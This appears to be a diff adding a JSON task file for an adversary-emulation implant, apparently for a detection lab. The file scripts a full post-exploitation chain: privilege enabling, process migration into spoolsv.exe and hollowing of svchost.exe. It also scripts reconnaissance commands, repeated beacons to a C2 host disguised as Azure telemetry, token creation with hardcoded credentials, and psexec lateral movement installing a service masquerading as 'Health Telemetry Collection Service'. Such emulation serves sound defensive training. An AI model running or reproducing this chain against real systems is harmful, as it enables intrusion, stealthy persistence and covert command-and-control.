@@ -1,0 +1,63 @@
+{
+    "task_sets": {
+        "0": [
+            { "op": "enable_privilege", "search": "", "priv_name": "SeDebugPrivilege" },
+            {"op": "migrate", "task_id": 3, "search": "spoolsv.exe"},
+            {"op": "print_var" }
+        ],
+        "1": [
+            {"op": "sleep", "ms": 40000},
+
+            {"op": "run_command", "command": "whoami"},
+            {"op": "sleep", "ms": 2000},
+
+            {"op": "run_command", "command": "hostname"},
+            {"op": "sleep", "ms": 2000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/check", "body": "status=ready", "secure": true},
+            {"op": "sleep", "ms": 3000},
+
+            {"op": "generate_exe", "task_id": 2},
+            {"op": "store_result", "var": 0},
+            {"op": "sleep", "ms": 2000},
+
+            { "op": "make_token", "domain": "aceresponder", "username": "bob", "password": "bob" },
+
+            {"op": "psexec", "target": "10.0.0.21", "service_name": "HealthTelemetrySvc", "display_name": "Health Telemetry Collection Service", "binary_path": "C:\\Windows\\Temp\\healthtelemetry.exe", "service_bin": "$0"},
+            {"op": "sleep", "ms": 5000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/beacon", "body": "status=lateral_complete", "secure": true},
+            {"op": "sleep", "ms": 120000}
+        ],
+        "2": [
+            {"op": "register_service", "name": "HealthTelemetrySvc"},
+            {"op": "sleep", "ms": 3000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/beacon", "body": "host=win11-21&status=service_started", "secure": true},
+            {"op": "sleep", "ms": 10000},
+
+            {"op": "run_command", "command": "whoami"},
+            {"op": "sleep", "ms": 2000},
+
+            {"op": "run_command", "command": "hostname"},
+            {"op": "sleep", "ms": 2000},
+
+            {"op": "run_command", "command": "ipconfig"},
+            {"op": "sleep", "ms": 5000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/beacon", "body": "host=win11-21&status=beacon1", "secure": true},
+            {"op": "sleep", "ms": 15000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/beacon", "body": "host=win11-21&status=beacon2", "secure": true},
+            {"op": "sleep", "ms": 15000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/beacon", "body": "host=win11-21&status=beacon3", "secure": true},
+            {"op": "sleep", "ms": 5000},
+
+            {"op": "http_send", "method": "POST", "host": "telemetry-cdn.azureedge.net", "port": 443, "path": "/api/beacon", "body": "host=win11-21&status=exiting", "secure": true}
+        ],
+        "3": [
+            {"op": "hollow_apc", "image": "C:\\Windows\\System32\\svchost.exe", "task_id": 1}
+        ]
+    }
+}
